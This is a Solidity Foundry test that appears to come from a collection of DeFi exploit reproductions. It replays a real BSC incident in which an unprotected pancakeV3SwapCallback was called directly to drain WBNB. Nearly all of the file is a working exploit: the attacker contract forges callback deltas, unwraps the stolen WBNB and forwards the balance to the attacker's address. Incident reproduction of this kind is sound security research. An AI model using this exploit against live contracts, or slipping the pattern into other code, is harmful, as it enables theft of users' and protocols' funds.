pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 100 USD
// Attacker : https://bscscan.com/address/0xba35d089addac99a8e7bcd1a25712b1702623ae3
// Attack Contract : https://bscscan.com/address/0xd310431e98412eb9a7c66808478bf08fdea81e2a
// Vulnerable Contract : https://bscscan.com/address/0x766a0936ff0ad045d39871846194edbd5df63a58
// Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0x73d459ad3c926f5247a2018197d13b2a0acbc1fc46e1e54525c210a46130a56b

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x766a0936ff0ad045d39871846194edbd5df63a58
// @Analysis

// Post-mortem : https://x.com/TenArmorAlert/status/1836339028616188321
// Twitter Guy : https://x.com/TenArmorAlert/status/1836339028616188321
// Hacking God : N/A

address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant addr1 = 0x766a0936FF0aD045d39871846194eDBd5DF63a58;
address constant attacker = 0xbA35D089adDaC99A8e7BcD1a25712B1702623Ae3;
address constant addr2 = 0x71cd31a564FF30ba61d7167a02Babc1484034E84;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 42357807);
        deal(attacker, 3.52e-15 ether);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        attC.attack{value: 3.52e-15 ether}();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
        emit log_named_decimal_uint("after attack: balance of address(attC)", IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c).balanceOf(address(attC)), 18);
    }
}

// 0xD310431E98412Eb9a7c66808478bF08fdea81E2a
contract AttackerC {
    function attack() public payable {
        int256 amount0Delta = -247659866327218868765;
        int256 amount1Delta = int256(int(51156128500000 * 3600));
        bytes memory data = abi.encode(address(this), addr1);

        bytes4 sel = bytes4(keccak256("pancakeV3SwapCallback(int256,int256,bytes)"));
        (bool ok, ) = addr2.call(abi.encodeWithSelector(sel, amount0Delta, amount1Delta, data));
        require(ok, "callback failed");

        withdraw();

        (bool s, ) = attacker.call{value:address(this).balance}("");
    }
  
    function withdraw() public {
        uint bal = IERC20(wbnb).balanceOf(address(this));
        if (bal > 1) {
            // Use call to avoid explicit conversion error
            (bool ok, ) = wbnb.call(abi.encodeWithSignature("withdraw(uint256)", bal - 1));
            require(ok, "withdraw failed");
        }
    }

    function token1() external pure returns (address) {
        return wbnb;
    }

    // fallback as per trace: no logic
    fallback() external payable { }
    receive() external payable { }
}